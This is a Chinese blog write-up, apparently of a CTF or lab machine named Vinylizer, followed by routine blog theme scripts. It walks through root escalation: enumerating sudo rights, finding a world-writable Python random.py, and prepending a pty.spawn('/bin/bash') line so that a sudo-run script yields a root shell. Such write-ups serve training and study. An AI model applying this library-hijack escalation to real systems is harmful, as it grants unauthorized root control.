+<h1 id="Root记录"><a href="#Root记录" class="headerlink" title="Root记录"></a>Root记录</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看机器上的所有用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:~$ awk -F<span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;($3 == 0) || ($3 &gt;= 1000) &#123; print &#125;&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">mrmidnight:x:1000:1000:mrmidnight:/home/mrmidnight:/bin/bash</span><br><span class="line">shopadmin:x:1001:1001:,,,:/home/shopadmin:/bin/bash</span><br></pre></td></tr></table></figure>
+<p><code>sudo -l</code>搭配<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/python/#sudo">gtfobins</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> shopadmin on vinylizer:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User shopadmin may run the following commands on vinylizer:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py</span><br></pre></td></tr></table></figure>
+<p>使用root权限运行该命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:~$ sudo /usr/bin/python3 /opt/vinylizer.py</span><br><span class="line">o      <span class="string">&#x27;O                  o</span></span><br><span class="line"><span class="string">O       o o               O  o</span></span><br><span class="line"><span class="string">o       O                 o</span></span><br><span class="line"><span class="string">o       o                 O</span></span><br><span class="line"><span class="string">O      O&#x27;</span> O  <span class="string">&#x27;OoOo. O   o o  O  ooOO .oOo. `OoOo.</span></span><br><span class="line"><span class="string">`o    o   o   o   O o   O O  o    o  OooO&#x27;</span>  o</span><br><span class="line"> `o  O    O   O   o O   o o  O   O   O      O</span><br><span class="line">  `o<span class="string">&#x27;     o&#x27;</span>  o   O `OoOO Oo o<span class="string">&#x27; OooO `OoO&#x27;</span>  o</span><br><span class="line">By: MrMidnight          o</span><br><span class="line">                     OoO<span class="string">&#x27;                         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter the name of the new album: root</span></span><br><span class="line"><span class="string">Enter the number of sides for the new album: 1</span></span><br><span class="line"><span class="string">Album &#x27;</span>root<span class="string">&#x27; with 1 sides added successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : Q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Quitting Vinylizer.</span></span><br></pre></td></tr></table></figure>
+<p>可以看出这是一个简单的选择唱片的程序<br>我们看一下这个py文件有没有修改的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:~$ <span class="built_in">ls</span> -l /opt/vinylizer.py</span><br><span class="line">-rw-r--r-- 1 root root 3810 Jan 20 14:55 /opt/vinylizer.py</span><br></pre></td></tr></table></figure>
+<p>好吧没有权限，gtfbins也无法直接提权<br>那我们再来看一下vinylizer.py的具体代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:~$ <span class="built_in">cat</span> /opt/vinylizer.py                                                           </span><br><span class="line"><span class="comment"># @Name: Vinylizer                 </span></span><br><span class="line"><span class="comment"># @Author: MrMidnight              </span></span><br><span class="line"><span class="comment"># @Version: 1.8                    </span></span><br><span class="line">                                   </span><br><span class="line">import json                        </span><br><span class="line">import random                      </span><br><span class="line">                                   </span><br><span class="line">def load_albums(filename):         </span><br><span class="line">    try:                           </span><br><span class="line">        with open(filename, <span class="string">&#x27;r&#x27;</span>) as file:                                                              </span><br><span class="line">            content = file.read()  </span><br><span class="line">            <span class="keyword">if</span> not content:        </span><br><span class="line">                <span class="built_in">return</span> []          </span><br><span class="line">            albums = json.loads(content)                                                               </span><br><span class="line">    except FileNotFoundError:      </span><br><span class="line">        albums = []                </span><br><span class="line">    except json.JSONDecodeError:   </span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;Error decoding JSON_Config: &#123;filename&#125;.&quot;</span>)                                              </span><br><span class="line">        albums = []                </span><br><span class="line">    <span class="built_in">return</span> albums                        </span><br></pre></td></tr></table></figure>
+<p>使用命令查看<code>shopadmin</code>用户可以写入哪些文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f ! -path <span class="string">&#x27;/proc/*&#x27;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207125831003-629277432.jpg" fancybox="true"/></div></div>
+<p><code>random.py</code>可以写入，同时vinylizer.py中也导入了random库</p>
+<h2 id="修改文件进入Root-Shell"><a href="#修改文件进入Root-Shell" class="headerlink" title="修改文件进入Root Shell"></a>修改文件进入Root Shell</h2><p>我们把<code>random.py</code>修改一下，将脚本添加在<code>random.py</code>上方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207131130737-1334994172.jpg" fancybox="true"/></div></div>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:/usr/lib/python3.10$ nano random.py </span><br><span class="line">shopadmin@vinylizer:/usr/lib/python3.10$ sudo python3 /opt/vinylizer.py </span><br><span class="line">root@vinylizer:/usr/lib/python3.10<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@vinylizer:/usr/lib/python3.10<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@vinylizer:/usr/lib/python3.10<span class="comment"># cd /root</span></span><br><span class="line">root@vinylizer:~<span class="comment"># ls</span></span><br><span class="line">root.txt  snap</span><br></pre></td></tr></table></figure>
+<p>🎉🎉🎉成功获得Root权限</p>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/09/30/Openstack/">OpenStack & Distributed Log Querier</a></div></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\09\02\htb-response\" title="HTB: Response"><span class="title">HTB: Response</span><span class="excerpt">人生第一次打Insane难度的机器，常规思路用完后的无力感油然而生。通过深度研究Rsa解密拿到权限才是真的😊</span></a><a class="item" href="\2023\09\02\shambles-01\" title="Shambles初体验&Totolink漏洞"><span class="title">Shambles初体验&Totolink漏洞</span><span class="excerpt">一个次世代新型逆向工具</span></a></div></section></div>
+
+
+
+  <div class='related-wrap md-text reveal' id="comments">
+    <section class='header cmt-title cap theme'>
+      快来参与讨论吧
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><center>
+</br>
+</br>
+<!--不蒜子计数器-->
+<script async src="https://npm.elemecdn.com/penndu@1.0.0/bsz.js"></script>
+<!--添加一个访问量-->
+<span>
+                👀总访问 <span id="busuanzi_value_site_pv" style="color: rgb(13, 109, 252); font-weight: bold;"></span>                次 | 🥷总访客 <span id="busuanzi_value_site_uv" style="color: rgb(13, 109, 252); font-weight: bold;"></span> 人
+</span>
+</br>
+</br>
+
+<p>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        stellar.loadScript('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://44maker-twikoo.hf.space"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
+    });
+</script>
+
+
+
+<!-- inject -->
+
+  
+    <script  src="https://jsd.cdn.zzko.cn/npm/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+  
+    <script>window.addEventListener('load', () => {  quicklink.listen();});</script>
+  
+
+
+  </div>
+</body>
+</html>
